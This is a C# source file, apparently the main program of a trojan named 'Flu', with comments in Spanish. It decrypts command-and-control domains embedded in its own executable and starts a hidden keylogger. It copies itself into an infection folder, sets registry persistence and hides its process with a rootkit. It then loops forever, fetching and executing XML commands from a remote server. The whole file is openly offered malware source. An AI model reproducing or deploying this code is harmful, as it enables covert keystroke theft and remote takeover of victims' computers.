using System;
using System.Collections.Generic;
using System.Threading;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Net.NetworkInformation;

namespace flu
{
    static class Program
    {
        /// <summary>
        /// Programa principal de Flu donde se ejecuta el bucle infinito que ejecuta todas las operaciones
        /// </summary>
        [STAThread]
        static void Main()
        {
            XMLReader xdoc = new XMLReader();
            
            StreamReader sr = new StreamReader(System.Windows.Forms.Application.ExecutablePath);
            BinaryReader br = new BinaryReader(sr.BaseStream);

            byte[] fileData = br.ReadBytes(Convert.ToInt32(sr.BaseStream.Length));
            br.Close(); 
            sr.Close();

            //Leemos el dominio y el fichero XML del exe
            int init = Encoding.ASCII.GetString(fileData).IndexOf("-||-"); // inicio de los datos
            string stringData = Encoding.ASCII.GetString(fileData, init, fileData.Length - init); // contenido
            stringData = stringData.Replace("-||-", "");

            // Parseamos los dominios decodificados por el carácter ¬
            string[] domains, domains2;
            domains = stringData.Split('¬');
            domains2 = Crypto.DecryptDomains(domains[0]).Split('¬');

            // URL del xml
            try{Network.XML = domains2[1]; }catch { }

            // URL del servidor
            try{Network.Domain = domains2[0]; }catch { }

            // MAC
            try{Network.MAC = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();}catch { }

            try
            {
                File file = new File(System.Windows.Forms.Application.ExecutablePath);
                string randomPath = string.Empty;
                string path = string.Empty;

                //Si reinicia Windows, la clave win32 existirá y no volveremos a copiar flu ni el fichero del keylogger en el PC
                bool isResetWin = file.existKey("win32");

                //Caso de que no esté infectado
                if (!isResetWin)
                {
                    randomPath = Path.GetRandomFileName().Replace(".", "");
                    //Fichero para ocultar el log del keylogger
                    path = OS.InfectionPath() + "\\" + randomPath + ".txt";
                }
                //Caso de que ya se encuentre infectado, recuperamos el nombre del registro de windows
                else
                {
                    path = file.getKeyValue("win32").Replace(".exe", ".txt");
                }
 
                try
                {
                    //Arrancamos el keylogger
                    KeyLogger kl = new KeyLogger(path);
                    kl.FlushInterval = Convert.ToDouble(15000);
                    kl.Enabled = true;
                    System.IO.StreamWriter swr = new System.IO.StreamWriter(path, true);
                    swr.WriteLine("Teclas pulsadas por el usuario:\r\n");
                    swr.Close();
                    //Ocultamos el keylogger
                    File fileKeylogger = new File(path);
                    fileKeylogger.Protect();
                }
                catch { }

                if (!isResetWin)
                {
                    try
                    {
                        // Ocultar el ejecutable inicial
                        file.Protect();

                        // Copiar ejecutable a la carpeta de infeccion
                        path = OS.InfectionPath() + "\\" + randomPath + ".exe";
                        file.CopyTo(path);

                        // Ocultar y registrar el nuevo ejecutable
                        file = new File(path);
                        file.Register(File.RunLocation.InRegistry);
                        file.Protect();
                    }
                    catch { }
                }
            }
            catch { }

            //Se oculta el proceso en el taskmanager mediante el método Hide de la clase Rootkit
            try { Rootkit.Hide(); } catch { }

            /* 
             * Ejecución central de Flu
             * Se actualiza estado, seleccionan instrucciones, se ejecutan y se espera 2 segundos
             */
            while (true)
            {
                try
                {
                    if (Network.Online()) // Si tenemos acceso a Internet
                    {
                        try { Network.UpdateState(OS.Version()); } catch { } // Mostrarnos como conectados en el servidor
                        try { xdoc.GetXML();         } catch { } // Descargar el XML con los nuevos comandos
                        try { xdoc.ExecuteXML();     } catch { System.Console.WriteLine("Error no hay XML cargado"); }
                    }
                    try { Thread.Sleep(2000); } catch { }
                } catch { }
            }
        }
    }
}
